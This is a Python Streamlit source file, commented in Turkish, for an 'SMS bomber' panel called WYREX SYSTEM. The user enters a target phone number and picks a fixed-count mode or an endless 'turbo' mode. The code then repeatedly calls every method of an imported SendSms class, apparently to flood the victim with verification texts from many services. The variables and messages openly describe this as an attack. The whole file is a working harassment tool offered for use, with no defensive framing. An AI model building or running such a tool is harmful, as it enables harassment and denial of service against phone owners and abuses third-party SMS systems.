import streamlit as st
import time
import re

# sms.py entegrasyonu
try:
    from sms import SendSms
except ImportError:
    st.error("HATA: sms.py dosyası bulunamadı!")

# 1. Sayfa Ayarları (Karanlık Mod Sabitleme)
st.set_page_config(page_title="WYREX SYSTEM", page_icon="🔴", layout="centered")

# 2. TAMAMEN BAŞTAN YARATILAN KIRMIZI NEON TASARIM (CSS)
st.markdown("""
    <style>
        /* Arka plan ve genel metin renklerini manipüle etme */
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        * {
            font-family: 'Share Tech Mono', monospace !important;
        }
        
        /* Büyük Neon Başlık */
        .neon-title {
            text-align: center;
            color: #ff003c;
            font-size: 50px;
            font-weight: bold;
            letter-spacing: 3px;
            text-shadow: 0 0 10px #ff003c, 0 0 20px #ff003c, 0 0 40px #ff0000;
            margin-top: 20px;
            margin-bottom: 5px;
        }
        
        /* Alt Başlık */
        .neon-sub {
            text-align: center;
            color: #ff99aa;
            font-size: 14px;
            letter-spacing: 2px;
            text-shadow: 0 0 5px #ff003c;
            margin-bottom: 30px;
        }
        
        /* Kırmızı Çizgi */
        hr {
            border: 0;
            height: 2px;
            background: linear-gradient(to right, transparent, #ff003c, transparent);
            margin-bottom: 30px;
        }
        
        /* Giriş kutuları başlıkları */
        label {
            color: #ff99aa !important;
            text-shadow: 0 0 3px #ff003c;
        }
        
        /* Buton Tasarımları (Kırmızı Neon) */
        div.stButton > button {
            background-color: #1a0005 !important;
            color: #ff003c !important;
            border: 2px solid #ff003c !important;
            box-shadow: 0 0 10px #ff003c;
            font-weight: bold !important;
            font-size: 18px !important;
            transition: all 0.3s ease;
        }
        div.stButton > button:hover {
            background-color: #ff003c !important;
            color: #ffffff !important;
            box-shadow: 0 0 25px #ff003c, 0 0 50px #ff0000;
            transform: scale(1.02);
        }
    </style>
""", unsafe_allow_html=True)

# Başlık Kısmı (Şimşekler kalktı, Wyrex System geldi)
st.markdown('<div class="neon-title">WYREX SYSTEM</div>', unsafe_allow_html=True)
st.markdown('<div class="neon-sub">CORE SMS PROTOCOL ENABLED</div>', unsafe_allow_html=True)
st.markdown("<hr>", unsafe_allow_html=True)

# 3. Temel Giriş Alanları (Aynı mantık, yeni görünüm)
numara_input = st.text_input("🎯 HEDEF TELEFON NUMARASI:", placeholder="Örn: 5051234567")
gizli_mail = "arexzy_panel@gmail.com"

mod = st.selectbox(
    "⚙️ OPERASYON MODU SEÇİN:",
    ["Seçim Yapınız...", "1- SMS Gönder (Normal Mod - Belirli Sayıda)", "2- SMS Gönder (Turbo Mod - Sonsuz/Durdurana Kadar)"]
)

# Filtreleme: Turbo modda miktar çubuğunu gizle
miktar = 0
if mod == "1- SMS Gönder (Normal Mod - Belirli Sayıda)":
    miktar = st.slider("📊 GÖNDERİLECEK SMS MİKTARI:", min_value=1, max_value=100, value=10)

st.markdown("<hr>", unsafe_allow_html=True)

# 4. Saldırı Durumu Yönetimi
if "saldiri_aktif" not in st.session_state:
    st.session_state.saldiri_aktif = False

# Tetikleyici Alan
if not st.session_state.saldiri_aktif:
    if st.button("İŞLEMİ BAŞLAT 💀", use_container_width=True):
        if not numara_input:
            st.error("❌ Numara alanı boş bırakılamaz!")
        elif mod == "Seçim Yapınız...":
            st.error("❌ Lütfen geçerli bir operasyon modu seçin!")
        else:
            temiz_numara = re.sub(r"\D", "", numara_input)
            if temiz_numara.startswith("0"):
                temiz_numara = temiz_numara[1:]
            
            if len(temiz_numara) != 10:
                st.error("❌ Geçersiz numara! 10 hane olmalı.")
            else:
                st.session_state.saldiri_aktif = True
                st.session_state.temiz_numara = temiz_numara
                st.session_state.secilen_mod = mod
                st.session_state.miktar = miktar
                st.rerun()

# Döngü ve Gönderim Paneli
if st.session_state.saldiri_aktif:
    # Kırmızı Tehlike Uyarısı
    st.markdown("<h4 style='color: #ff003c; text-align: center; text-shadow: 0 0 5px #ff003c;'>⚠️ SİSTEM AKTİF: İSTEKLER GÖNDERİLİYOR ⚠️</h4>", unsafe_allow_html=True)
    
    # Kırmızı Durdurma Butonu
    dur_butonu = st.button("🔴 SİSTEMİ DURDUR (STOP)", use_container_width=True)
    if dur_butonu:
        st.session_state.saldiri_aktif = False
        st.success("Sistem güvenli moda alındı. Durduruldu. ✅")
        st.rerun()

    no = st.session_state.temiz_numara
    aktif_mod = st.session_state.secilen_mod
    
    with st.spinner("Kırmızı hatlar tetikleniyor..."):
        try:
            islem = SendSms(no, gizli_mail)
            
            # sms.py fonksiyonlarını çek
            servisler_sms = []
            for attribute in dir(SendSms):
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value) and not attribute.startswith('__'):
                    servisler_sms.append(attribute)

            # 🚀 NORMAL MOD
            if "Normal Mod" in aktif_mod:
                toplam_adet = st.session_state.miktar
                sayac_alani = st.empty()
                
                for i in range(toplam_adet):
                    for metot_adi in servisler_sms:
                        metot = getattr(islem, metot_adi)
                        metot()
                    sayac_alani.markdown(f"<p style='color: #ff99aa;'>📊 Döngü: [{i+1}/{toplam_adet}] tamamlandı.</p>", unsafe_allow_html=True)
                    time.sleep(0.3)
                
                st.session_state.saldiri_aktif = False
                st.success("🎯 Hedeflenen paket başarıyla gönderildi!")
                st.rerun()

            # 🚀 TURBO MOD (Durdurana Kadar Sonsuz)
            elif "Turbo Mod" in aktif_mod:
                sayac = 0
                turbo_sayac_alani = st.empty()
                
                while st.session_state.saldiri_aktif:
                    sayac += 1
                    for metot_adi in servisler_sms:
                        try:
                            metot = getattr(islem, metot_adi)
                            metot()
                        except:
                            pass
                    turbo_sayac_alani.markdown(f"<p style='color: #ff003c; font-size: 20px; font-weight: bold; text-shadow: 0 0 5px #ff003c;'>🔥 TURBO: {sayac}. döngü turu basılıyor...</p>", unsafe_allow_html=True)
                    time.sleep(0.1)
                    
        except Exception as e:
            st.error(f"Kritik Hata: {e}")
            st.session_state.saldiri_aktif = False

# Alt Bilgi
st.write("")
st.markdown("<p style='text-align: center; color: #550011; font-size: 12px;'>WYREX SYSTEM © 2026</p>", unsafe_allow_html=True)
